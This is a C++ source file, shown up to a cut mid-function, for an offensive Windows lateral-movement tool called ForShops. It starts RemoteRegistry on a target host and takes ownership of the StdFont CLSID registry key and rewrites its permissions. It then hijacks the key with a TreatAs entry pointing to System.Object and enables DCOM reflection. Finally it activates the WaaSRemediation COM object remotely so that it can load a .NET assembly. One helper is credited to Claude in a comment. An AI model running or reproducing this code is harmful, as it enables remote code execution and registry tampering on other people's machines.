// This file is part of ForShops.
//
// Copyright (c) 2025 ForShops
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.
//
// This project includes code from IE11SandboxEscapes(https://github.com/tyranid/IE11SandboxEscapes) by James Forshaw, 
// licensed under GNU General Public License v3.0. See the project license(https://github.com/tyranid/IE11SandboxEscapes/blob/master/LICENSE) for details.
// Source information for author's code is provided below.

#include <windows.h>
#include <olectl.h>
#include <iostream>
#include <stdio.h>
#include <vector>
#include <aclapi.h>
#include <metahost.h>
#pragma comment(lib, "mscoree.lib")
#pragma warning(disable : 4996)
#import "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\mscorlib.tlb" raw_interfaces_only rename("ReportEvent", "_ReportEvent") rename("or", "_or")

using namespace mscorlib;

typedef struct _ORIGINAL_REG_VALUES {
    PVOID AllowDCOMReflection;
    PVOID OnlyUseLatestCLR;
    PVOID StandardFontTreatAs;
    BOOLEAN NetFrameworkKey_Exists;
} ORIGINAL_REG_VALUES, * PORIGINAL_VALUES;

typedef struct _ACL_INFO {
    PSID_IDENTIFIER_AUTHORITY NtAuthority;
    PSID AdminSid;
    PSID TrustedInstallerSid;
}ACL_INFO, * PACL_INFO;


static const IID LIBID_StdFont = { 0x00020430, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
static const CLSID CLSID_StdFont = { 0x0be35203, 0x8f91, 0x11ce, { 0x9d, 0xe3, 0x00, 0xaa, 0x00, 0x4b, 0xb8, 0x51 } };
static const IID IID_IFont = { 0xbef6e003, 0xa874, 0x101a, { 0x8b, 0xba, 0x00, 0xaa, 0x00, 0x30, 0x0c, 0xab } };
static const IID IID_IObject = { 0x65074F7F, 0x63C0, 0x304E, { 0xAF, 0x0A, 0xD5, 0x17, 0x41, 0xCB, 0x4A, 0x8D } };

ORIGINAL_REG_VALUES og = { 0 };
BOOLEAN EnableRemoteRegistry = FALSE;

// Claude
uint8_t* readFileToBytes(LPSTR filename, size_t* outSize) {
    // Open file
    HANDLE fileHandle = CreateFileA(
        filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (fileHandle == INVALID_HANDLE_VALUE) {
        *outSize = 0;
        return nullptr;
    }

    // Get file size
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(fileHandle, &fileSize)) {
        CloseHandle(fileHandle);
        *outSize = 0;
        return nullptr;
    }

    // Check if file is too large
    if (fileSize.QuadPart > SIZE_MAX) {
        CloseHandle(fileHandle);
        *outSize = 0;
        return nullptr;
    }

    // Allocate buffer
    size_t bufferSize = static_cast<size_t>(fileSize.QuadPart);
    uint8_t* buffer = (uint8_t*)malloc(bufferSize);
    if (!buffer) {
        CloseHandle(fileHandle);
        *outSize = 0;
        return nullptr;
    }

    // Read file
    DWORD bytesRead;
    size_t totalBytesRead = 0;
    size_t remainingBytes = bufferSize;

    while (remainingBytes > 0) {
        if (!ReadFile(
            fileHandle,
            buffer + totalBytesRead,
            static_cast<DWORD>(min(remainingBytes, MAXDWORD)),
            &bytesRead,
            nullptr
        )) {
            free(buffer);
            CloseHandle(fileHandle);
            *outSize = 0;
            return nullptr;
        }

        if (bytesRead == 0) break; // End of file

        totalBytesRead += bytesRead;
        remainingBytes -= bytesRead;
    }

    CloseHandle(fileHandle);
    *outSize = totalBytesRead;
    return buffer;
}

//VXAPI
SIZE_T CharStringToWCharString(_Inout_ PWCHAR Destination, _In_ PCHAR Source, SIZE_T _In_ MaximumAllowed)
{
    INT Length = (INT)MaximumAllowed;

    while (--Length >= 0)
    {
        if (!(*Destination++ = *Source++))
            return MaximumAllowed - Length - 1;
    }

    return MaximumAllowed - Length;
}
/* @brief Start remote registry with pipe trick
*   Source: https://x.com/splinter_code/status/1715876413474025704
*   Author: Antonio Cocomazzi (@splinter_code)
* @param [IN] computerName - ansi string of the computer name to start the remoteregistry on
*/
VOID StartRemoteRegistry(LPSTR computerName) {
    HANDLE hPipe;
    CHAR  remoteRegistryPipe[255] = { 0 };

    sprintf(remoteRegistryPipe, "\\\\%s\\pipe\\winreg", computerName);
    printf("[+] Opening a handle to %s\n", remoteRegistryPipe);
    hPipe = CreateFileA(remoteRegistryPipe, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE && GetLastError() != ERROR_PIPE_BUSY) {
        printf("[-] Error opening handle: 0x%llx\n", GetLastError());
    }
    else {
        printf("[+] Triggered pipe. RemoteRegistry should now be started\n");
    }
    CloseHandle(hPipe);
    memset(remoteRegistryPipe, 0, sizeof(remoteRegistryPipe));
}

/*@brief Helper to create a key
* @param [IN]  hRemoteRegistry - Handle to a remote registry where the key is to be created
* @param [IN]  KeyName         - String name of the key to create
* @return TRUE for function success, FALSE if it failed.
*/
BOOLEAN CreateKey(_In_ HKEY hRemoteRegistry, _In_ LPSTR KeyName) {
    BOOLEAN ret = FALSE;
    LSTATUS result = NULL;
    HKEY    temp = NULL;

    if (!hRemoteRegistry || !KeyName) {
        return ret;
    }

    // Try to create it
    result = RegCreateKeyExA(hRemoteRegistry, KeyName, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &temp, NULL);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to create key %s - RegCreateKeyExA: 0x%x\n", KeyName, result);
        goto cleanup;
    }
    printf("[+] Created %s successfully\n", KeyName);

    ret = TRUE;
cleanup:
    if (temp) RegCloseKey(temp);
    return ret;
}

/* @brief Helper to check if a key exists
* @param [IN]  hRemoteRegistry - Handle to a remote registry where the key is to be checked
* @param [IN]  KeyName         - String name of the key to check
* @param [OUT] Exists          - Pointer to a boolean that will indicate if the key existed already
* @return TRUE for function success, FALSE if it failed.
*/
BOOLEAN CheckKey(_In_ HKEY hRemoteRegistry, _In_ LPSTR KeyName, _Out_ PBOOLEAN Exists) {
    BOOLEAN ret = FALSE;
    LSTATUS result = NULL;
    HKEY    temp = NULL;

    if (!hRemoteRegistry || !KeyName || !Exists) {
        return ret;
    }

    printf("[+] Checking if %s exists\n", KeyName);
    result = RegOpenKeyExA(hRemoteRegistry, KeyName, 0, KEY_READ, &temp);
    if (result != ERROR_SUCCESS) {
        if (result == ERROR_FILE_NOT_FOUND) {
            *Exists = FALSE;
            printf("[+] %s doesn't exist, going to try to create it\n", KeyName);
        }
        else {
            printf("[-] Failed to check if %s exists - RegOpenKeyExA: 0x%x\n", KeyName, result);
            goto cleanup;
        }
    }
    else {
        *Exists = TRUE;
    }
    ret = TRUE;
cleanup:
    if (temp) RegCloseKey(temp);
    return ret;
}

/* @brief Helper to check if a key exists and create it if it doesn't
* @param [IN]  hRemoteRegistry - Handle to a remote registry where the key is to be checked and/or created
* @param [IN]  KeyName         - String name of the key to check and/or create
* @param [OUT] Exists          - Pointer to a boolean that will indicate if the key existed already
* @return TRUE for function success, FALSE if it failed.
*/
BOOLEAN CheckAndCreateKey(_In_ HKEY hRemoteRegistry, _In_ LPSTR KeyName, _Out_ PBOOLEAN Exists) {

    if (!hRemoteRegistry || !KeyName || !Exists) {
        return FALSE;
    }

    if (!CheckKey(hRemoteRegistry, KeyName, Exists)) {
        return FALSE;
    }
    if (!CreateKey(hRemoteRegistry, KeyName)) {
        return FALSE;
    }

    return TRUE;
}

/* @brief Helper to delete a key
* @param [IN]  hRemoteRegistry - Handle to a remote registry where the key is to be deleted
* @param [IN]  KeyName         - String name of the key to delete
* @return TRUE for function success, FALSE if it failed.
*/
BOOLEAN DeleteKey(_In_ HKEY hRemoteRegistry, _In_ LPSTR KeyName) {

    HRESULT result = RegDeleteKeyA(hRemoteRegistry, KeyName);
    if (result != ERROR_SUCCESS) {
        printf("[-] Error deleting %s - RegDeleteKeyA: 0x%x\n", KeyName, result);
        return FALSE;
    }
    return TRUE;
}

/* @brief Helper to check if a key exists and read its value
* @param [IN]      hRemoteRegistry - Handle to a remote registry where the key is to be checked
* @param [IN]      KeyName         - String name of the key to check
* @param [IN]      ValueName       - String name of the value to read
* @param [OUT]     Exists          - Pointer to a boolean that will indicate if the value existed already
* @param [OUT_OPT] Value           - Pointer to a pointer that will be populated with a heap allocation. This must be freed by the caller. If this is NULL, this function only checks if the value exists.
* @return TRUE for function success, FALSE if it failed.
*/
BOOLEAN ReadValue(_In_ HKEY hRemoteRegistry, _In_ LPSTR KeyName, _In_ LPSTR ValueName, _Out_ PBOOLEAN Exists, _Out_opt_ PVOID* Value) {

    BOOLEAN ret = FALSE;
    LSTATUS result = NULL;
    DWORD   sz = 0;
    DWORD   type = 0;
    HKEY    hKey = NULL;

    if (!hRemoteRegistry || !KeyName || !ValueName || !Exists) {
        return ret;
    }

    printf("[+] Checking if %s exists\n", KeyName);
    result = RegOpenKeyExA(hRemoteRegistry, KeyName, 0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS) {
        if (result == ERROR_FILE_NOT_FOUND) {
            printf("[+] %s doesn't exist.\n", KeyName);
            *Exists = FALSE;
        }
        else {
            printf("[-] Failed to check if %s exists - RegOpenKeyExA: 0x%x\n", KeyName, result);
            goto cleanup;
        }
    }
    else {
        printf("[+] %s exists, reading value.\n", KeyName);
        result = RegQueryValueExA(hKey, ValueName, NULL, &type, NULL, &sz);
        if (result == ERROR_FILE_NOT_FOUND) {
            *Exists = FALSE;
            printf("[+] Value: %s doesn't exist\n", ValueName);
            ret = TRUE;
            goto cleanup;
        }
        else if (result == ERROR_SUCCESS) {
            *Exists = TRUE;
            if (Value) {
                *Value = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
                result = RegQueryValueExA(hKey, ValueName, NULL, &type, (LPBYTE)*Value, &sz);
                if (result != ERROR_SUCCESS) {
                    printf("[-] Error when reading the %s value on %s - RegQueryValueEx: 0x%x\n", ValueName, KeyName, result);
                    goto cleanup;
                }
            }
        }
        else {
            printf("[-] Error - RegQueryValueExA: 0x%x\n", result);
            goto cleanup;
        }
    }
    ret = TRUE;
cleanup:
    if (hKey) RegCloseKey(hKey);
    return ret;
}

/* @brief Helper to write a value into a key
* @param [IN]     hRemoteRegistry - Handle to a remote registry where the value is to be written
* @param [IN]     KeyName         - String name of the key where the value is to be written
* @param [IN]     ValueName       - String name of the value to write
* @param [IN]     Type            - Registry data type to be written
* @param [IN_OPT] Value           - Pointer to a pointer that contains the value to write. If this is NULL, the value will instead be DELETED.
* @param [IN]     Size            - Size of data. If NULL, then writing default value in.
* @return TRUE for function success, FALSE if it failed.
*/
BOOLEAN WriteValue(_In_ HKEY hRemoteRegistry, _In_ LPSTR KeyName, _In_ LPSTR ValueName, _In_ DWORD Type, _In_opt_ PVOID Value, _In_ DWORD size) {
    BOOLEAN ret = FALSE;
    LSTATUS result = NULL;
    HKEY    hKey = NULL;

    if (!hRemoteRegistry || !KeyName || !ValueName) {
        return ret;
    }

    printf("[+] Getting handle to %s\n", KeyName);
    result = RegOpenKeyExA(hRemoteRegistry, KeyName, 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to check if %s exists - RegOpenKeyExA: 0x%x\n", KeyName, result);
        goto cleanup;

    }

    if (Value) {
        printf("[+] Writing value into %s\n", KeyName);

        if (!size) {
            Value = NULL;
        }

        result = RegSetValueExA(hKey, ValueName, 0, Type, (PBYTE)Value, size);
        if (result != ERROR_SUCCESS) {
            printf("[-] Failed to set %s value on %s - RegSetValueExA: 0x%x\n", ValueName, KeyName, result);
            goto cleanup;
        }
    }
    else {
        printf("[+] Deleting %s from %s\n", ValueName, KeyName);
        result = RegDeleteValueA(hKey, ValueName);
        if (result != ERROR_SUCCESS) {
            printf("[-] Failed to delete %s value on %s - RegDeleteValueA: 0x%x\n", ValueName, KeyName, result);
            goto cleanup;
        }
    }
    ret = TRUE;
cleanup:
    if (hKey) RegCloseKey(hKey);
    return ret;
}

/* @brief Function to change Clsid key ownership
* @param [IN] hRemoteRegistry - handle to the remote registry key
* @param [IN] clsidKey        - ansi string with the full path to the key we are taking ownership of
* @param [IN] adminSid        - pointer to the SID with the RIDs of the objects that will own the key
* @return - FALSE for failure, true for success
*/
BOOLEAN ChangeClsidKeyOwner(_In_ HKEY hRemoteRegistry, _In_ LPSTR clsidKey, _In_ PSID adminSid)
{
    HKEY hKey = NULL;
    HKEY hRootKey = HKEY_LOCAL_MACHINE;
    LONG result = FALSE;
    BOOLEAN ret = FALSE;
    SECURITY_DESCRIPTOR sd;

    // Open the registry key with WRITE_OWNER access
    result = RegOpenKeyExA(hRemoteRegistry, clsidKey, 0, WRITE_OWNER, &hKey);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to open %s with WRITE_OWNER access - RegOpenKeyExA: 0x%x\n", clsidKey, GetLastError());
        goto cleanup;
    }

    // Initialize a new security descriptor
    if (!(InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)))
    {
        printf("[-] Failed to create a new security descriptor - InitializeSecurityDescriptor: 0x%x\n", GetLastError());
        goto cleanup;
    }

    // Set the owner in the security descriptor
    if (!SetSecurityDescriptorOwner(&sd, adminSid, FALSE))
    {
        printf("[-] Failed to set ownership in the security descriptor - SetSecurityDescriptorOwner: 0x%x\n", GetLastError());
        goto cleanup;
    }

    // Apply the updated security descriptor to the registry key
    result = RegSetKeySecurity(hKey, OWNER_SECURITY_INFORMATION, &sd);
    if (result != ERROR_SUCCESS)
    {
        printf("[-] Failed to set ownership of %s - RegSetKeySecurity: 0x%x\n", clsidKey, GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully changed the owner of the registry key\n");
    ret = TRUE;

    // Clean up
cleanup:
    if (hKey) RegCloseKey(hKey);
    return ret;
}

/* @brief Function to adjust Clsid Key DACL to enable key modification
* @param [IN] hRemoteRegistry - handle to the remote registry key
* @param [IN] clsidKey        - ansi string with the full path to the key we are taking ownership of
* @param [IN] adminSid        - pointer to the SID with the RIDs of the objects that will be granted [accessMask]
* @param [IN] accessMask      - AccessMask to be granted to the SID
* @return - FALSE for failure, true for success
*/
BOOLEAN ChangeClsidKeyDacl(_In_ HKEY hRemoteRegistry, _In_ LPSTR clsidKey, _In_ PSID adminSid, _In_ DWORD accessMask)
{

    PSECURITY_DESCRIPTOR pSD = NULL;
    EXPLICIT_ACCESS      ea = { 0 };
    SECURITY_DESCRIPTOR  newSD = { 0 };
    DWORD    cbSecurityDescriptor = 0;
    BOOLEAN  ret = FALSE;
    BOOL     bDaclPresent = FALSE;
    BOOL     bDaclDefaulted = FALSE;
    HKEY     hRegKey = NULL;
    PACL     pOldAcl = NULL;
    PACL     pNewAcl = NULL;
    LONG     result = NULL;

    result = RegOpenKeyExA(hRemoteRegistry, clsidKey, 0, KEY_READ | WRITE_DAC, &hRegKey);
    if (result != ERROR_SUCCESS)
    {
        printf("[-] Failed to open %s with Read and Write DACL access - RegOpenKeyExA: 0x%x\n", clsidKey, GetLastError());
        goto cleanup;
    }

    // Get the existing security descriptor using RegGetKeySecurity
    result = RegGetKeySecurity(hRegKey, DACL_SECURITY_INFORMATION, NULL, &cbSecurityDescriptor);
    if (result != ERROR_SUCCESS && result != ERROR_INSUFFICIENT_BUFFER)
    {
        printf("[-] Failed to query %s's security descriptor size - RegGetKeySecurity: 0x%x\n", clsidKey, result);
        goto cleanup;
    }

    pSD = (PSECURITY_DESCRIPTOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbSecurityDescriptor);
    result = RegGetKeySecurity(hRegKey, DACL_SECURITY_INFORMATION, pSD, &cbSecurityDescriptor);
    if (result != ERROR_SUCCESS)
    {
        printf("[-] Failed to read %s's security descriptor - RegGetKeySecurity: 0x%x\n", clsidKey, result);
        goto cleanup;
    }

    // Get the DACL from the security descriptor
    if (!GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pOldAcl, &bDaclDefaulted))
    {
        printf("[-] Failed to get DACL from security descriptor - GetSecurityDescriptorDacl: 0x%x\n", GetLastError());
        goto cleanup;
    }

    // Setup the new access
    ea.grfAccessPermissions = accessMask;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea.Trustee.ptstrName = (LPWCH)adminSid;

    // Create new ACL combining old and new
    result = SetEntriesInAclW(1, &ea, pOldAcl, &pNewAcl);
    if (result != ERROR_SUCCESS)
    {
        printf("[-] Failed to create ACL to enable key modification - SetEntriesInAclW: 0x%x\n", GetLastError());
        goto cleanup;
    }

    // Create new security descriptor
    if (!InitializeSecurityDescriptor(&newSD, SECURITY_DESCRIPTOR_REVISION))
    {
        printf("[-] Failed to initialize security descriptor to enable key modification - InitializeSecurityDescriptor: 0x%x\n", GetLastError());
        goto cleanup;
    }

    if (!SetSecurityDescriptorDacl(&newSD, TRUE, pNewAcl, FALSE))
    {
        printf("[-] Failed to create DACL to enable key modification - SetSecurityDescriptorDacl: 0x%x\n", GetLastError());
        goto cleanup;
    }

    result = RegSetKeySecurity(hRegKey, DACL_SECURITY_INFORMATION, &newSD);
    if (result != ERROR_SUCCESS)
    {
        printf("[-] Failed to set DACL to enable key modification - RegSetKeySecurity: 0x%x\n", GetLastError());
        goto cleanup;
    }

    ret = TRUE;
    printf("[+] Changed CLSID Key DACL\n");
cleanup:
    if (hRegKey) RegCloseKey(hRegKey);
    if (pNewAcl) LocalFree(pNewAcl);
    if (pSD)     HeapFree(GetProcessHeap(), NULL, pSD);
    return ret;
}

// TODO: change all registry operations to use least privilege handle
/* @brief Check for target CLSID's existence, and if it exists, try to write an AppID value and key to expose it to DCOM
* @param [IN]     target    - ansi string hostname or ip address of target
* @param [IN]     Clean     - BOOLEAN indicating we are deleting the AppID value and the AppID key
* @param [IN_OPT] sids      - PACL_INFO with sids. Can be NULL unless ModifyRegistryACL is TRUE.
* @return 0 for success, 1 for error
*/
BOOLEAN DoRegistry_RPC(_In_ LPSTR target, _In_ BOOLEAN Clean, _In_opt_ PACL_INFO sids) {

    HKEY    hRemoteReg = NULL;
    LSTATUS result = NULL;
    BOOLEAN ret = TRUE;
    LPSTR   value = NULL;
    BOOLEAN exists = FALSE;
    CHAR regst_buffer[255] = { 0 };

    CHAR* NetFrameworkKey = (PCHAR)("SOFTWARE\\Microsoft\\.NETFramework");
    CHAR* StandardFont_CLSID = (PCHAR)("SOFTWARE\\Classes\\CLSID\\{0BE35203-8F91-11CE-9DE3-00AA004BB851}");
    CHAR* StandardFont_Treat = (PCHAR)("SOFTWARE\\Classes\\CLSID\\{0BE35203-8F91-11CE-9DE3-00AA004BB851}\\TreatAs");
    CHAR* System_Object_GUID = (PCHAR)("{81C5FE01-027C-3E1C-98D5-DA9C9862AA21}");

    DWORD sz = strlen(target);

    // Check if target hostname is too large
    if (sz > sizeof(regst_buffer) - 1) {
        printf("[-] Target is too large\n");
        goto cleanup;
    }

    // Prepare strings
    sprintf(regst_buffer, "\\\\%s", target);

    // Check and enable Remote Registry
    if (EnableRemoteRegistry) {
        StartRemoteRegistry(target);
    }

    // Connect Registry
    result = RegConnectRegistryA(regst_buffer, HKEY_LOCAL_MACHINE, &hRemoteReg);
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to connect to %s's registry - RegConnectRegistry: 0x%x\n", target, result);
        goto cleanup;
    }
    printf("[+] Connected to: %s\n", regst_buffer);

    if (!Clean) {

        // Check if .NetFramework Key exists
        if (!CheckKey(hRemoteReg, NetFrameworkKey, &exists)) {
            goto cleanup;
        }
        // Create the key
        if (!exists) {
            if (!CreateKey(hRemoteReg, NetFrameworkKey)) {
                goto cleanup;
            }
            og.NetFrameworkKey_Exists = FALSE;
        }
        else {
            og.NetFrameworkKey_Exists = TRUE;
        }

        // Check and set AllowDCOMReflection
        DWORD one = 1;
        if (!ReadValue(hRemoteReg, NetFrameworkKey, (LPSTR)"AllowDCOMReflection", &exists, &og.AllowDCOMReflection)) {
            goto cleanup;
        }
        if (!WriteValue(hRemoteReg, NetFrameworkKey, (LPSTR)"AllowDCOMReflection", REG_DWORD, &one, sizeof(one))) {
            goto cleanup;
        }

        // Check and set OnlyUseLatestCLR
        if (!ReadValue(hRemoteReg, NetFrameworkKey, (LPSTR)"OnlyUseLatestCLR", &exists, &og.OnlyUseLatestCLR)) {
            goto cleanup;
        }
        if (!WriteValue(hRemoteReg, NetFrameworkKey, (LPSTR)"OnlyUseLatestCLR", REG_DWORD, &one, sizeof(one))) {
            goto cleanup;
        }

        // Check if TreatAs Key exists
        exists = FALSE;
        if (!CheckKey(hRemoteReg, StandardFont_Treat, &exists)) {
            goto cleanup;
        }
        if (exists) {
            printf("[+] TreatAs subkey exists on StandardFont for some reason. Going to try to read it...\n");
            if (!ReadValue(hRemoteReg, StandardFont_Treat, (LPSTR)"", &exists, &og.StandardFontTreatAs)) {
                goto cleanup;
            }
        }

        // Set Key ownership to Administrators and grant KEY_ALL_ACCESS to Administrator
        printf("[+] Trying to obtain ownership of %s...\n", StandardFont_CLSID);
        if (!ChangeClsidKeyOwner(hRemoteReg, StandardFont_CLSID, sids->AdminSid)) {
            goto cleanup;
        }

        printf("[+] Trying to set KEY_ALL_ACCESS on %s...\n", StandardFont_CLSID);
        if (!ChangeClsidKeyDacl(hRemoteReg, StandardFont_CLSID, sids->AdminSid, KEY_ALL_ACCESS)) {
            goto cleanup;
        }

        if (!exists) {
            // Create TreatAs Key
            if (!CreateKey(hRemoteReg, StandardFont_Treat)) {
                goto cleanup;
            }
        }

        printf("[+] Trying to set KEY_ALL_ACCESS on %s...\n", StandardFont_Treat);
        if (!ChangeClsidKeyDacl(hRemoteReg, StandardFont_Treat, sids->AdminSid, KEY_ALL_ACCESS)) {
            goto cleanup;
        }

        // Set TreatAs key default value to System.Object
        if (!WriteValue(hRemoteReg, StandardFont_Treat, (LPSTR)"", REG_SZ, System_Object_GUID, strlen(System_Object_GUID) + 1)) {
            goto cleanup;
        }
    }
    else {

        // Restore original values, if applicable. Otherwise, Delete
        if (og.AllowDCOMReflection) {
            WriteValue(hRemoteReg, NetFrameworkKey, (PCHAR)"AllowDCOMReflection", REG_DWORD, og.AllowDCOMReflection, sizeof(DWORD));
        }
        else {
            WriteValue(hRemoteReg, NetFrameworkKey, (PCHAR)"AllowDCOMReflection", NULL, NULL, 0);
        }

        if (og.OnlyUseLatestCLR) {
            WriteValue(hRemoteReg, NetFrameworkKey, (PCHAR)"OnlyUseLatestCLR", REG_DWORD, og.OnlyUseLatestCLR, sizeof(DWORD));
        }
        else {
            WriteValue(hRemoteReg, NetFrameworkKey, (PCHAR)"OnlyUseLatestCLR", NULL, NULL, 0);
        }

        if (og.StandardFontTreatAs) {
            WriteValue(hRemoteReg, StandardFont_Treat, (PCHAR)"", REG_SZ, og.StandardFontTreatAs, 0);
        }
        else {
            DeleteKey(hRemoteReg, StandardFont_Treat);
        }

        if (!og.NetFrameworkKey_Exists) {
            if (!DeleteKey(hRemoteReg, NetFrameworkKey)) {
                goto cleanup;
            }
        }

        // Note: Best effort to restore a TrustedInstaller SID. More research needed for determining specific OS SIDs/variations.
        // Restore ownership to TrustedInstaller and keep Administrator at KEY_READ
        printf("[+] Trying to set KEY_READ on %s...\n", StandardFont_CLSID);
        if (!ChangeClsidKeyDacl(hRemoteReg, StandardFont_CLSID, sids->AdminSid, KEY_READ)) {
            goto cleanup;
        }

        printf("[+] Trying to reset ownership of %s...\n", StandardFont_CLSID);
        if (!ChangeClsidKeyOwner(hRemoteReg, StandardFont_CLSID, sids->TrustedInstallerSid)) {
            goto cleanup;
        }
    }
    ret = FALSE;
cleanup:
    if (value)      HeapFree(GetProcessHeap(), NULL, value);
    if (hRemoteReg) RegCloseKey(hRemoteReg);
    return ret;

}

/*
*   Author: James Forshaw (@tiraniddo)
*   Source: https://github.com/tyranid/IE11SandboxEscapes/blob/master/CVE-2014-0257/CVE-2014-0257.cpp
*/
long GetSafeArrayLen(LPSAFEARRAY psa)
{
    long ubound = 0;
    SafeArrayGetUBound(psa, 1, &ubound);
    return ubound + 1;
}

/*
*   Author: James Forshaw (@tiraniddo)
*   Source: https://github.com/tyranid/IE11SandboxEscapes/blob/master/CVE-2014-0257/CVE-2014-0257.cpp
*/
mscorlib::_MethodInfoPtr GetStaticMethod(mscorlib::_TypePtr type, LPCWSTR findName, int pcount)
{
    DWORD      counter = 0;
    SAFEARRAY* methods = nullptr;
    HRESULT hr = type->GetMethods_2(&methods);
    if (FAILED(hr) || !methods) return nullptr;

    mscorlib::_MethodInfoPtr ret;
    LONG methodCount = GetSafeArrayLen(methods);

    for (long i = 0; i < methodCount; ++i)
    {
        IUnknown* v = nullptr;
        if (SUCCEEDED(SafeArrayGetElement(methods, &i, &v)))
        {
            mscorlib::_MethodInfoPtr method = v;
            BSTR methodName = nullptr;
            method->get_name(&methodName);  // Fixed: Use get_name with BSTR parameter

            SAFEARRAY* params = nullptr;
            method->GetParameters(&params);
            long paramCount = params ? GetSafeArrayLen(params) : 0;

            VARIANT_BOOL isStatic = VARIANT_FALSE;
            method->get_IsStatic(&isStatic);

            if (isStatic == VARIANT_TRUE && wcscmp(methodName, findName) == 0 && paramCount == pcount)
            {
                //////////
                if (wcscmp(methodName, L"Load") == 0 && counter < 2) {
                    counter++;
                    continue;
                }
                //////////
                ret = method;
                if (params) SafeArrayDestroy(params);
                SysFreeString(methodName);
                break;
            }

            if (params) SafeArrayDestroy(params);
            SysFreeString(methodName);
        }
    }

    SafeArrayDestroy(methods);
    return ret;
}

/*
*   Author: James Forshaw (@tiraniddo)
*   Source: https://github.com/tyranid/IE11SandboxEscapes/blob/master/CVE-2014-0257/CVE-2014-0257.cpp
*/ 
template<typename T> T ExecuteMethod(mscorlib::_MethodInfoPtr method, std::vector<variant_t>& args, HRESULT* o_hr = NULL)
{
    variant_t obj;
    T retObj;

    SAFEARRAY* psa;
    SAFEARRAYBOUND rgsabound[1];

    rgsabound[0].lLbound = 0;
    rgsabound[0].cElements = (ULONG)args.size();
    psa = SafeArrayCreate(VT_VARIANT, 1, rgsabound);

    for (LONG i = 0; i < (LONG)args.size(); ++i)
    {
        SafeArrayPutElement(psa, &i, &args[i]);
    }

    VARIANT vtRet;
    VariantInit(&vtRet);
    HRESULT hr = method->Invoke_3(obj, psa, &vtRet);  // Fixed: Added vtRet parameter to match CLR v4 signature

    printf("Invoke_3: 0x%x\n", hr);
    if ((vtRet.vt == VT_UNKNOWN) || (vtRet.vt == VT_DISPATCH))
    {
        retObj = vtRet.punkVal;
    }

    VariantClear(&vtRet);
    SafeArrayDestroy(psa);

    if (o_hr) {
        *o_hr = hr;
    }
    return retObj;
}

// Main code base for performing lat mvmt
BOOLEAN ExecuteForShops(LPSTR target, LPSTR assemblyPath) {
    _com_ptr_t<_com_IIID<ITypeLib, &__uuidof(ITypeLib)>> pTypeLib;
    _com_ptr_t<_com_IIID<ITypeLib, &__uuidof(ITypeLib)>> pTypeLib2;
    _com_ptr_t<_com_IIID<ITypeInfo, &__uuidof(ITypeInfo)>> pTypeInfo;
    _com_ptr_t<_com_IIID<ITypeInfo, &__uuidof(ITypeInfo)>> pTypeInfo2;
    _com_ptr_t<_com_IIID<ITypeInfo, &__uuidof(ITypeInfo)>> pTypeInfo3;
    mscorlib::_ObjectPtr obj;
    mscorlib::_TypePtr type;
    mscorlib::_TypePtr type2;
    mscorlib::_TypePtr type3;
    mscorlib::_TypePtr baseType;
    mscorlib::_MethodInfoPtr getTypeMethod;
    mscorlib::_MethodInfoPtr loadMethod;
    HREFTYPE hRef = NULL;

    try
    {
        std::wcout << L"[*] Initializing COM environment..." << std::endl;
        HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
        if (FAILED(hr)) throw hr;

        //////////////////////////////
        CLSID clsid;
        IID   iid;
        IDispatch* pDispatch = nullptr;
        hr = CLSIDFromString(L"{72566E27-1ABB-4EB3-B4F0-EB431CB1CB32}", &clsid);    // WaaSRemediation
        if (FAILED(hr)) {
            std::cout << "Invalid CLSID" << std::endl;
            CoUninitialize();
            return 1;
        }
        hr = CLSIDFromString(L"{34050212-8AEB-416D-AB76-1E45521DB615}", &iid);      // IWaaSRemediation idk i picked randomly. but {B4C1D279-966E-44E9-A9C5-CCAF4A77023D} (IWaaSRemediationEx) works too
        if (FAILED(hr)) {
            std::cout << "Invalid CLSID" << std::endl;
            CoUninitialize();
            return 1;
        }

        // Set up the COSERVERINFO structure
        WCHAR wTarget[255] = { 0 };
        CharStringToWCharString(wTarget, target, strlen(target));
        COSERVERINFO serverInfo = { 0 };
        serverInfo.pwszName = wTarget;

        // Set up MULTI_QI structure
        MULTI_QI multiQI;
        multiQI.pIID = &IID_IDispatch;
        multiQI.pItf = nullptr;
        multiQI.hr = S_OK;

        // Use CoCreateInstanceEx for remote activation
        hr = CoCreateInstanceEx(clsid, nullptr, CLSCTX_REMOTE_SERVER, &serverInfo, 1, &multiQI);
        if (FAILED(hr)) throw hr;

        pDispatch = (IDispatch*)multiQI.pItf;
        hr = pDispatch->GetTypeInfo(0, NULL, &pTypeInfo);
        if (SUCCEEDED(hr))
        {
            //////////////////////////////
            hr = pTypeInfo->GetContainingTypeLib(&pTypeLib, 0);
